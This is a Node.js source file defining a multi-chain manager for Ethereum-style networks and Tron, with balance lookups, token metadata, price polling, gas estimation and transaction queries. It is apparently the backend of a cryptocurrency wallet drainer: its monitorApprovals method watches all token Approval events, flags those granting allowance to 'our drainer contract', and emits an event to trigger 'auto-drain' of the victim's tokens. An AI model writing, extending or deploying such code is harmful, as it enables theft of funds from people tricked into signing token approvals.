const { ethers } = require('ethers');
const TronWeb = require('tronweb');
const axios = require('axios');
const winston = require('winston');

class ChainManager {
    constructor() {
        this.logger = winston.createLogger({
            level: 'info',
            format: winston.format.combine(
                winston.format.timestamp(),
                winston.format.json()
            ),
            transports: [
                new winston.transports.File({ filename: 'logs/chain-manager.log' }),
                new winston.transports.Console()
            ]
        });

        this.providers = {};
        this.tronWeb = null;
        this.contracts = {};
        this.tokenPrices = {};

        this.initializeProviders();
        this.initializeTronWeb();
        this.startPriceUpdates();
    }

    initializeProviders() {
        // EVM Networks
        const networks = {
            ethereum: process.env.ETH_RPC_URL,
            bsc: process.env.BSC_RPC_URL,
            polygon: process.env.POLYGON_RPC_URL,
            arbitrum: process.env.ARBITRUM_RPC,
            optimism: process.env.OPTIMISM_RPC
        };

        for (const [network, rpcUrl] of Object.entries(networks)) {
            if (rpcUrl) {
                try {
                    this.providers[network] = new ethers.JsonRpcProvider(rpcUrl);
                    this.logger.info(`Initialized provider for ${network}`);
                } catch (error) {
                    this.logger.error(`Failed to initialize ${network} provider:`, error);
                }
            }
        }
    }

    initializeTronWeb() {
        try {
            const privateKey = process.env.TRON_PRIVATE_KEY;
            if (!privateKey || privateKey === 'dummy_private_key_for_testing_only_not_for_production_use' || privateKey === '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef') {
                this.logger.warn('TronWeb initialization skipped - using dummy/test private key');
                this.tronWeb = null;
                return;
            }
            this.tronWeb = new TronWeb({
                fullHost: 'https://api.trongrid.io',
                privateKey: privateKey
            });
            this.logger.info('Initialized TronWeb');
        } catch (error) {
            this.logger.error('Failed to initialize TronWeb:', error);
        }
    }

    async startPriceUpdates() {
        // Update token prices every 5 minutes
        setInterval(async () => {
            await this.updateTokenPrices();
        }, 5 * 60 * 1000);

        // Initial update
        await this.updateTokenPrices();
    }

    async updateTokenPrices() {
        try {
            // Get prices from CoinGecko
            const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
                params: {
                    ids: 'ethereum,binancecoin,matic-network,usd-coin,tether',
                    vs_currencies: 'usd'
                }
            });

            this.tokenPrices = {
                ETH: response.data.ethereum?.usd || 0,
                BNB: response.data.binancecoin?.usd || 0,
                MATIC: response.data['matic-network']?.usd || 0,
                USDC: response.data['usd-coin']?.usd || 1,
                USDT: response.data.tether?.usd || 1
            };

            this.logger.info('Updated token prices:', this.tokenPrices);
        } catch (error) {
            this.logger.error('Failed to update token prices:', error);
        }
    }

    async getBalance(network, address, tokenAddress = null) {
        try {
            if (network === 'tron') {
                return await this.getTronBalance(address, tokenAddress);
            }

            const provider = this.providers[network];
            if (!provider) {
                throw new Error(`Provider not available for ${network}`);
            }

            if (tokenAddress) {
                // ERC20 balance
                const contract = new ethers.Contract(
                    tokenAddress,
                    ['function balanceOf(address) view returns (uint256)'],
                    provider
                );
                const balance = await contract.balanceOf(address);
                return ethers.formatEther(balance);
            } else {
                // Native token balance
                const balance = await provider.getBalance(address);
                return ethers.formatEther(balance);
            }
        } catch (error) {
            this.logger.error(`Failed to get balance for ${address} on ${network}:`, error);
            return '0';
        }
    }

    async getTronBalance(address, tokenAddress = null) {
        try {
            if (!this.tronWeb) {
                throw new Error('TronWeb not initialized');
            }

            if (tokenAddress) {
                // TRC20 balance
                const contract = await this.tronWeb.contract().at(tokenAddress);
                const balance = await contract.balanceOf(address).call();
                return this.tronWeb.toDecimal(balance);
            } else {
                // TRX balance
                const balance = await this.tronWeb.trx.getBalance(address);
                return this.tronWeb.fromSun(balance);
            }
        } catch (error) {
            this.logger.error(`Failed to get Tron balance for ${address}:`, error);
            return '0';
        }
    }

    async getTokenInfo(network, tokenAddress) {
        try {
            if (network === 'tron') {
                return await this.getTronTokenInfo(tokenAddress);
            }

            const provider = this.providers[network];
            if (!provider) {
                throw new Error(`Provider not available for ${network}`);
            }

            const contract = new ethers.Contract(
                tokenAddress,
                [
                    'function name() view returns (string)',
                    'function symbol() view returns (string)',
                    'function decimals() view returns (uint8)',
                    'function totalSupply() view returns (uint256)'
                ],
                provider
            );

            const [name, symbol, decimals, totalSupply] = await Promise.all([
                contract.name().catch(() => 'Unknown'),
                contract.symbol().catch(() => 'UNK'),
                contract.decimals().catch(() => 18),
                contract.totalSupply().catch(() => '0')
            ]);

            return {
                address: tokenAddress,
                name,
                symbol,
                decimals,
                totalSupply: ethers.formatEther(totalSupply),
                network
            };
        } catch (error) {
            this.logger.error(`Failed to get token info for ${tokenAddress}:`, error);
            return null;
        }
    }

    async getTronTokenInfo(tokenAddress) {
        try {
            if (!this.tronWeb) {
                throw new Error('TronWeb not initialized');
            }

            const contract = await this.tronWeb.contract().at(tokenAddress);

            const [name, symbol, decimals] = await Promise.all([
                contract.name().call().catch(() => 'Unknown'),
                contract.symbol().call().catch(() => 'UNK'),
                contract.decimals().call().catch(() => 6)
            ]);

            return {
                address: tokenAddress,
                name,
                symbol,
                decimals,
                network: 'tron'
            };
        } catch (error) {
            this.logger.error(`Failed to get Tron token info for ${tokenAddress}:`, error);
            return null;
        }
    }

    async monitorApprovals(network, contractAddress) {
        try {
            if (network === 'tron') {
                return await this.monitorTronApprovals(contractAddress);
            }

            const provider = this.providers[network];
            if (!provider) {
                throw new Error(`Provider not available for ${network}`);
            }

            // Listen for Approval events
            const filter = {
                address: null, // Listen to all addresses
                topics: [
                    ethers.id("Approval(address,address,uint256)")
                ]
            };

            provider.on(filter, async (log) => {
                try {
                    const parsedLog = {
                        transactionHash: log.transactionHash,
                        blockNumber: log.blockNumber,
                        owner: '0x' + log.topics[1].slice(26),
                        spender: '0x' + log.topics[2].slice(26),
                        amount: ethers.formatEther(log.data),
                        network,
                        timestamp: Date.now()
                    };

                    // Check if spender is our drainer contract
                    if (parsedLog.spender.toLowerCase() === contractAddress.toLowerCase()) {
                        this.logger.info('Detected approval for drainer:', parsedLog);
                        // Emit event for auto-drain
                        this.emit('approvalDetected', parsedLog);
                    }
                } catch (error) {
                    this.logger.error('Error parsing approval log:', error);
                }
            });

            this.logger.info(`Started monitoring approvals on ${network}`);
        } catch (error) {
            this.logger.error(`Failed to monitor approvals on ${network}:`, error);
        }
    }

    async monitorTronApprovals(contractAddress) {
        // Tron approval monitoring would require event listening
        // This is a simplified version
        this.logger.info('Tron approval monitoring started (simplified)');
    }

    async estimateGas(network, tx) {
        try {
            if (network === 'tron') {
                return await this.estimateTronGas(tx);
            }

            const provider = this.providers[network];
            if (!provider) {
                throw new Error(`Provider not available for ${network}`);
            }

            const gasEstimate = await provider.estimateGas(tx);
            const feeData = await provider.getFeeData();

            return {
                gasLimit: gasEstimate,
                gasPrice: feeData.gasPrice,
                maxFeePerGas: feeData.maxFeePerGas,
                maxPriorityFeePerGas: feeData.maxPriorityFeePerGas
            };
        } catch (error) {
            this.logger.error(`Failed to estimate gas on ${network}:`, error);
            return null;
        }
    }

    async estimateTronGas(tx) {
        // Simplified Tron gas estimation
        return {
            feeLimit: 100000000, // 100 TRX
            energy: 50000
        };
    }

    async getTransaction(network, txHash) {
        try {
            if (network === 'tron') {
                return await this.getTronTransaction(txHash);
            }

            const provider = this.providers[network];
            if (!provider) {
                throw new Error(`Provider not available for ${network}`);
            }

            const tx = await provider.getTransaction(txHash);
            const receipt = await provider.getTransactionReceipt(txHash);

            return {
                ...tx,
                receipt,
                confirmations: receipt ? await provider.getBlockNumber() - receipt.blockNumber : 0
            };
        } catch (error) {
            this.logger.error(`Failed to get transaction ${txHash}:`, error);
            return null;
        }
    }

    async getTronTransaction(txHash) {
        try {
            if (!this.tronWeb) {
                throw new Error('TronWeb not initialized');
            }

            const tx = await this.tronWeb.trx.getTransaction(txHash);
            const receipt = await this.tronWeb.trx.getTransactionInfo(txHash);

            return {
                ...tx,
                receipt
            };
        } catch (error) {
            this.logger.error(`Failed to get Tron transaction ${txHash}:`, error);
            return null;
        }
    }

    // Event emitter functionality
    events = {};

    on(event, callback) {
        if (!this.events[event]) {
            this.events[event] = [];
        }
        this.events[event].push(callback);
    }

    emit(event, data) {
        if (this.events[event]) {
            this.events[event].forEach(callback => callback(data));
        }
    }
}

module.exports = ChainManager;